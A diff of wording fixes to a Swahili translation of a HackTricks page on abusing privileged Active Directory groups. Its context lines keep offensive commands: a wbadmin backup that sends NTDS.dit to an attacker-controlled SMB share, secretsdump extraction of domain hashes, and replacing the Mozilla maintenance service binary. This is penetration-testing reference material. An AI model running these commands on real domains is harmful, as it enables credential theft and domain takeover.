@@ -24,13 +24,13 @@ Get Access Today:
 
 ## Well Known groups with administration privileges
 
-* **Wasimamizi**
-* **Wasimamizi wa Kikoa**
-* **Wasimamizi wa Biashara**
+* **Wakurugenzi**
+* **Wakurugenzi wa Kikoa**
+* **Wakurugenzi wa Biashara**
 
 ## Account Operators
 
-Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Zaidi ya hayo, kinaruhusu kuingia kwa ndani kwenye Kituo cha Kikoa (DC).
+Kikundi hiki kina uwezo wa kuunda akaunti na vikundi ambavyo si wasimamizi kwenye kikoa. Aidha, kinaruhusu kuingia kwa ndani kwenye Kituo cha Kikoa (DC).
 
 Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
 ```powershell
@@ -62,7 +62,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 ### Domain Controller Access
 
-Upatikanaji wa faili kwenye DC umepunguziliwa mbali isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha upatikanaji.
+Upatikanaji wa faili kwenye DC umewekwa mipaka isipokuwa mtumiaji ni sehemu ya kundi la `Server Operators`, ambalo hubadilisha kiwango cha upatikanaji.
 
 ### Privilege Escalation
 
@@ -138,7 +138,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 #### Kutumia wbadmin.exe
 
 1. Weka mfumo wa faili wa NTFS kwa seva ya SMB kwenye mashine ya mshambuliaji na uhifadhi akiba ya akreditivu za SMB kwenye mashine lengwa.
-2. Tumia `wbadmin.exe` kwa ajili ya akiba ya mfumo na uchimbaji wa `NTDS.dit`:
+2. Tumia `wbadmin.exe` kwa ajili ya nakala ya mfumo na uchimbaji wa `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -152,7 +152,7 @@ Kwa maonyesho ya vitendo, angalia [VIDEO YA DEMO NA IPPSEC](https://www.youtube.
 
 Wajumbe wa kundi la **DnsAdmins** wanaweza kutumia mamlaka yao kupakia DLL isiyo na mipaka yenye mamlaka ya SYSTEM kwenye seva ya DNS, mara nyingi inayoendeshwa kwenye Wajenzi wa Kikoa. Uwezo huu unaruhusu uwezekano mkubwa wa unyakuzi.
 
-Ili orodhesha wajumbe wa kundi la DnsAdmins, tumia:
+Ili kuorodhesha wajumbe wa kundi la DnsAdmins, tumia:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
@@ -198,17 +198,17 @@ Wajumbe wanaweza kufikia kumbukumbu za matukio, huenda wakapata taarifa nyeti ka
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Exchange Windows Permissions
-Kikundi hiki kinaweza kubadilisha DACLs kwenye kituo cha kikoa, huenda kikatoa haki za DCSync. Mbinu za kupandisha hadhi zinazotumia kikundi hiki zimeelezewa katika repo ya Exchange-AD-Privesc ya GitHub.
+## Exchange Windows Permissions  
+Kikundi hiki kinaweza kubadilisha DACLs kwenye kituo cha kikoa, huenda kikatoa ruhusa za DCSync. Mbinu za kupandisha hadhi zinazotumia kikundi hiki zimeelezewa katika repo ya Exchange-AD-Privesc ya GitHub.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Wataalam wa Hyper-V
-Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambayo inaweza kutumika kupata udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
+Wataalam wa Hyper-V wana ufikiaji kamili wa Hyper-V, ambayo inaweza kutumiwa kupata udhibiti wa Wataalam wa Kikoa wa virtualized. Hii inajumuisha kunakili DCs za moja kwa moja na kutoa NTLM hashes kutoka kwa faili ya NTDS.dit.
 
 ### Mfano wa Kutumia
-Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumika na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyolindwa na kuibadilisha na executable mbaya:
+Huduma ya Matengenezo ya Mozilla ya Firefox inaweza kutumiwa na Wataalam wa Hyper-V kutekeleza amri kama SYSTEM. Hii inahusisha kuunda kiungo kigumu kwa faili ya SYSTEM iliyo na ulinzi na kuibadilisha na executable yenye uharibifu:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -223,7 +223,7 @@ Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojuli
 ### Ukatili wa Haki na Amri
 
 #### Opereta wa Print
-Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kuifunga, na kusimamia printa. Ili kutumia haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na hadhi, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
+Wajumbe wa kundi la **Opereta wa Print** wanapewa haki kadhaa, ikiwa ni pamoja na **`SeLoadDriverPrivilege`**, ambayo inawaruhusu **kuingia kwa ndani kwenye Kidhibiti cha Kikoa**, kukifunga, na kusimamia printa. Ili kutumia haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na kiwango cha juu, kupita Udhibiti wa Akaunti ya Mtumiaji (UAC) ni muhimu.
 
 Ili kuorodhesha wajumbe wa kundi hili, amri ifuatayo ya PowerShell inatumika:
 ```powershell
@@ -286,7 +286,7 @@ Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
 * **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki hila za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
